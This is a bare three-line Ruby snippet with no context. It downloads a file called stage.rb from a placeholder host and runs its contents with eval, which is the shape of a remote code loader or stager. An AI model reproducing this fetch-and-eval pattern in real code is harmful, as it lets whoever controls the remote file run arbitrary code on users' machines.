require "open-uri"
body = URI.open("https://example.test/stage.rb").read
eval(body)
